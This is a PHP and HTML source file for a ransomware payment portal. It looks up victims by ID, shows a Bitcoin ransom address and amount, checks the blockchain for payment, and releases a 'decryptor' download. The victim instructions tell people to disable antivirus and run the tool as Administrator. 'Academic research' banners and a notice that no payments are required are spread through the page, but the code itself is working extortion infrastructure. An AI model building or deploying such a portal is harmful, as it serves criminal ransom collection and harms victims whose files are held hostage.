<?php
/**
 * Victim Recovery Portal
 * Web interface for victims to check payment status and download decryptor
 * For defensive cybersecurity research purposes only
 */

require_once 'database.php';
require_once 'bitcoin_api.php';

$db = new Database();
$bitcoin_api = new BitcoinAPI();

$victim_id = $_GET['id'] ?? '';
$step = $_GET['step'] ?? 'verify';
$message = '';
$error = '';

if ($_POST['action'] ?? '') {
    switch ($_POST['action']) {
        case 'check_payment':
            $victim_id = $_POST['victim_id'];
            $victim = $db->getVictimByVictimId($victim_id);
            $payment = $db->getPaymentByVictimId($victim_id);
            
            if ($victim && $payment) {
                if ($payment['payment_received']) {
                    $message = "Payment verified! You can now download your decryptor.";
                    $step = 'download';
                } else {
                    // Check payment status
                    $verification = $bitcoin_api->verifyPayment(
                        $payment['bitcoin_address'],
                        $payment['amount_btc'],
                        72
                    );
                    
                    if ($verification['verified']) {
                        $db->markPaymentReceived($victim_id, $verification['transactions'][0]['txid'] ?? 'verified_' . time());
                        $message = "Payment just verified! Preparing your decryptor...";
                        $step = 'download';
                    } else {
                        $error = "Payment not yet confirmed. Please ensure you sent the correct amount to the Bitcoin address.";
                    }
                }
            } else {
                $error = "Invalid victim ID or no payment record found.";
            }
            break;
    }
}

$victim_data = null;
$payment_data = null;

if ($victim_id) {
    $victim_data = $db->getVictimByVictimId($victim_id);
    $payment_data = $db->getPaymentByVictimId($victim_id);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Recovery Portal - Academic Research</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .portal-container {
            background: rgba(255, 255, 255, 0.95);
            max-width: 600px;
            width: 100%;
            border-radius: 20px;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.2);
            overflow: hidden;
        }
        
        .portal-header {
            background: linear-gradient(135deg, #2c3e50, #34495e);
            color: white;
            padding: 30px;
            text-align: center;
        }
        
        .research-badge {
            background: #e74c3c;
            color: white;
            padding: 5px 15px;
            border-radius: 15px;
            font-size: 12px;
            font-weight: bold;
            margin-bottom: 15px;
            display: inline-block;
        }
        
        .portal-content {
            padding: 40px;
        }
        
        .step-indicator {
            display: flex;
            justify-content: center;
            margin-bottom: 30px;
        }
        
        .step {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 10px;
            font-weight: bold;
            color: white;
        }
        
        .step.active {
            background: #667eea;
        }
        
        .step.completed {
            background: #27ae60;
        }
        
        .step.pending {
            background: #bdc3c7;
        }
        
        .form-group {
            margin-bottom: 25px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #2c3e50;
        }
        
        input[type="text"] {
            width: 100%;
            padding: 15px;
            border: 2px solid #ecf0f1;
            border-radius: 10px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        
        input[type="text"]:focus {
            outline: none;
            border-color: #667eea;
        }
        
        .btn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }
        
        .btn-success {
            background: linear-gradient(135deg, #27ae60, #2ecc71);
        }
        
        .btn-success:hover {
            box-shadow: 0 10px 20px rgba(39, 174, 96, 0.3);
        }
        
        .alert {
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
        }
        
        .alert-success {
            background: #d5f4e6;
            color: #27ae60;
            border: 1px solid #27ae60;
        }
        
        .alert-error {
            background: #fdf2f2;
            color: #e74c3c;
            border: 1px solid #e74c3c;
        }
        
        .payment-info {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
        }
        
        .payment-detail {
            margin-bottom: 15px;
        }
        
        .payment-label {
            font-size: 14px;
            color: #666;
            margin-bottom: 5px;
        }
        
        .payment-value {
            font-size: 18px;
            font-weight: 600;
            color: #2c3e50;
            word-break: break-all;
        }
        
        .research-notice {
            background: #e8f4f8;
            padding: 20px;
            border-radius: 10px;
            margin-top: 30px;
            text-align: center;
            font-size: 14px;
            color: #2c3e50;
            border: 2px solid #3498db;
        }
        
        .download-section {
            text-align: center;
            padding: 30px 0;
        }
        
        .file-icon {
            font-size: 64px;
            color: #667eea;
            margin-bottom: 20px;
        }
        
        .progress-bar {
            width: 100%;
            height: 10px;
            background: #ecf0f1;
            border-radius: 5px;
            overflow: hidden;
            margin: 20px 0;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #667eea, #764ba2);
            transition: width 0.3s ease;
        }
        
        .instructions {
            background: #fff3cd;
            border: 1px solid #ffc107;
            color: #856404;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="portal-container">
        <div class="portal-header">
            <div class="research-badge">🎓 RESEARCH ENVIRONMENT</div>
            <h1>🔓 File Recovery Portal</h1>
            <p>Academic Cybersecurity Research Tool</p>
        </div>
        
        <div class="portal-content">
            <!-- Step Indicator -->
            <div class="step-indicator">
                <div class="step <?= $step === 'verify' ? 'active' : ($step !== 'verify' ? 'completed' : 'pending') ?>">1</div>
                <div class="step <?= $step === 'download' ? 'active' : 'pending' ?>">2</div>
                <div class="step pending">3</div>
            </div>
            
            <?php if ($message): ?>
                <div class="alert alert-success"><?= htmlspecialchars($message) ?></div>
            <?php endif; ?>
            
            <?php if ($error): ?>
                <div class="alert alert-error"><?= htmlspecialchars($error) ?></div>
            <?php endif; ?>
            
            <?php if ($step === 'verify'): ?>
                <!-- Step 1: Verify Payment -->
                <h3>Step 1: Verify Your Payment</h3>
                <p>Enter your unique victim ID to check payment status and access your file recovery tool.</p>
                
                <form method="POST">
                    <input type="hidden" name="action" value="check_payment">
                    <div class="form-group">
                        <label for="victim_id">Victim ID:</label>
                        <input type="text" id="victim_id" name="victim_id" value="<?= htmlspecialchars($victim_id) ?>" 
                               placeholder="Enter your unique victim ID" required>
                    </div>
                    <button type="submit" class="btn">Check Payment Status</button>
                </form>
                
                <?php if ($victim_data && $payment_data && !$payment_data['payment_received']): ?>
                    <div class="payment-info">
                        <h4>Payment Information</h4>
                        <div class="payment-detail">
                            <div class="payment-label">Bitcoin Address:</div>
                            <div class="payment-value"><?= htmlspecialchars($payment_data['bitcoin_address']) ?></div>
                        </div>
                        <div class="payment-detail">
                            <div class="payment-label">Amount Required:</div>
                            <div class="payment-value"><?= htmlspecialchars($payment_data['amount_btc']) ?> BTC</div>
                        </div>
                        <div class="payment-detail">
                            <div class="payment-label">USD Equivalent (Approx):</div>
                            <div class="payment-value">$<?= number_format($payment_data['amount_usd'] ?? 0, 2) ?></div>
                        </div>
                    </div>
                    
                    <div class="instructions">
                        <strong>Payment Instructions:</strong>
                        <ol style="margin-left: 20px; margin-top: 10px;">
                            <li>Send the exact Bitcoin amount to the address above</li>
                            <li>Wait for at least 1 blockchain confirmation (10-60 minutes)</li>
                            <li>Return to this page and click "Check Payment Status"</li>
                        </ol>
                    </div>
                <?php endif; ?>
                
            <?php elseif ($step === 'download'): ?>
                <!-- Step 2: Download Decryptor -->
                <div class="download-section">
                    <div class="file-icon">💾</div>
                    <h3>Step 2: Download Recovery Tool</h3>
                    <p>Your payment has been verified. You can now download the file recovery tool.</p>
                    
                    <div class="progress-bar">
                        <div class="progress-fill" style="width: 100%;"></div>
                    </div>
                    
                    <?php if ($victim_data): ?>
                        <a href="api/download_decryptor.php?victim_id=<?= urlencode($victim_data['victim_id']) ?>" 
                           class="btn btn-success" style="display: inline-block; text-decoration: none; margin-top: 20px;">
                            📥 Download File Recovery Tool
                        </a>
                        
                        <div class="instructions" style="margin-top: 30px; text-align: left;">
                            <strong>Recovery Instructions:</strong>
                            <ol style="margin-left: 20px; margin-top: 10px;">
                                <li>Download the recovery tool to your affected computer</li>
                                <li>Disable your antivirus temporarily (the tool may be flagged)</li>
                                <li>Run the tool as Administrator</li>
                                <li>The tool will automatically recover your files</li>
                                <li>Wait for the process to complete - DO NOT interrupt it</li>
                            </ol>
                        </div>
                        
                        <div class="payment-info" style="margin-top: 20px;">
                            <h4>Recovery Details</h4>
                            <div class="payment-detail">
                                <div class="payment-label">System ID:</div>
                                <div class="payment-value"><?= htmlspecialchars($victim_data['victim_id']) ?></div>
                            </div>
                            <div class="payment-detail">
                                <div class="payment-label">Files to Recover:</div>
                                <div class="payment-value"><?= number_format($victim_data['files_encrypted'] ?? 0) ?> files</div>
                            </div>
                            <div class="payment-detail">
                                <div class="payment-label">Encryption Method:</div>
                                <div class="payment-value">XChaCha20-Poly1305</div>
                            </div>
                        </div>
                    <?php endif; ?>
                </div>
            <?php endif; ?>
            
            <div class="research-notice">
                <strong>🎓 Academic Research Notice</strong><br>
                This is a controlled cybersecurity research environment. This recovery portal simulates 
                real ransomware payment and recovery processes for defensive security research purposes only.
                <br><br>
                <strong>No actual payments are required or should be made.</strong>
            </div>
        </div>
    </div>
    
    <script>
        // Auto-refresh payment check every 30 seconds if on verify step
        <?php if ($step === 'verify' && $victim_data && $payment_data && !$payment_data['payment_received']): ?>
        setInterval(function() {
            if (document.getElementById('victim_id').value) {
                // Auto-submit form to check payment status
                const form = document.querySelector('form');
                if (form) {
                    form.submit();
                }
            }
        }, 30000);
        <?php endif; ?>
        
        // Download tracking
        document.addEventListener('DOMContentLoaded', function() {
            const downloadButton = document.querySelector('a[href*="download_decryptor"]');
            if (downloadButton) {
                downloadButton.addEventListener('click', function() {
                    // Track download initiation
                    console.log('File recovery tool download initiated');
                    
                    // Show progress indicator
                    setTimeout(function() {
                        alert('Download started! The file recovery tool will begin downloading. Please follow the recovery instructions carefully.');
                    }, 1000);
                });
            }
        });
    </script>
</body>
</html>